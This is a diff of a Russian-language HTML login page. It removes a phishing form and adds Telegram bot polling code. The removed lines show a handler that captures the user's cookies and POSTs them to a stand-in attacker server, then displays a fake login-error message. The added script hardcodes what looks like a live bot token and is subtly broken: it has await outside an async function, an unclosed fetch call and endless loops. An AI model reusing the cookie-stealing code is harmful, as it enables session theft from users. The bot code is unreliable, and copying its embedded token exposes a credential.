@@ -6,29 +6,28 @@
   <title>Вход в аккаунт</title>
 </head>
 <body>
-  <h1>Введите данные для входа</h1>
-  <form action="#" method="POST" onsubmit="stealCookies(event)">
-    <label for="username">Логин:</label>
-    <input type="text" id="username" name="username" required><br>
-    <label for="password">Пароль:</label>
-    <input type="password" id="password" name="password" required><br>
-    <button type="submit">Войти</button>
-  </form>
-
   <script>
-    function stealCookies(event) {
-      event.preventDefault(); // Останавливаем стандартную отправку формы
-      const cookies = document.cookie; // Получаем все куки текущего пользователя
-      
-      // Отправляем куки злоумышленнику
-      fetch('https://злой-сервер.зло/steal', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ stolenCookies: cookies })
-      }).then(() => alert("Ошибка входа, попробуйте снова!"));
+    function polling() {
+      let offset = 0;
+      const token = "6351302491:AAGReWD3gXVrdOC7AwVt-9OdKlwaxBk895w";
+      const tokenhttps = `https://api.telegram.org/bot${token}/getUpdates?offset=${offset}`;
+      while (true) {
+        new Promise(resolve => setTimeout(resolve, 1000));
+        const response = await fetch(tokenhttps);
+        const data = response.json();
+        if (data.ok) {
+          const updates = data.result;
+
+          for (let update of updates) {
+            const message = update.message;
+            if (message === "/start") {
+              await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${message.chat.id}&text=${message.text}`;
+            }
+          }
+        }
+      }
     }
+    while (true) polling();
   </script>
 </body>
 </html>
